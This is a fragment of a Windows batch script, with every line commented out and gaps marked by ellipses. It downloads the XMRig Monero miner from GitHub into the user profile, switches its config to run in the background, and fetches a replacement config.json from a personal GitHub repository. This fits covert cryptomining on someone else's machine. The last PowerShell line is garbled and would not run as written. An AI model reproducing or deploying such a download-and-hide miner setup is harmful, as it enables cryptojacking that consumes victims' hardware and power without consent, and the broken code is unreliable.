...
REM IF EXIST "%USERPROFILE%\xmrig" GOTO REMOVE_DIR0

REM echo [*] Looking for the latest version of Monero miner
REM for /f tokens^=2^ delims^=^" %%a IN ('powershell -Command "[Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls'; $wc = New-Object System.Net.WebClient; $str = $wc.DownloadString('https://github.com/xmrig/xmrig/releases/latest'); $str | findstr msvc-win64.zip | findstr download"') DO set MINER_ARCHIVE=%%a
REM set "MINER_LOCATION=https://github.com%MINER_ARCHIVE%"

REM echo [*] Downloading "%MINER_LOCATION%" to "%USERPROFILE%\xmrig.zip"
REM powershell -Command "[Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls'; $wc = New-Object System.Net.WebClient; $wc.DownloadFile('%MINER_LOCATION%', '%USERPROFILE%\xmrig.zip')"
REM if errorlevel 1 (
...
REM copy /Y "%USERPROFILE%\XMRig\config.json" "%USERPROFILE%\XMRig\config_background.json" >NUL
REM powershell -Command "$out = cat '%USERPROFILE%\XMRig\config_background.json' | %%{$_ -replace '\"background\": *false,', '\"background\": true,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\XMRig\config_background.json'" 
REM powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/Abados-tm/XMRig/main/config.json', '%USERPROFILE%\xmrig\config.json')"
REM powershell -Command "New-Object Net.WebClient; .DownloadFile('https://raw.githubusercontent.com/Abados-tm/XMRig/main/config.json', '%USERPROFILE%\xmrig\config.json')"
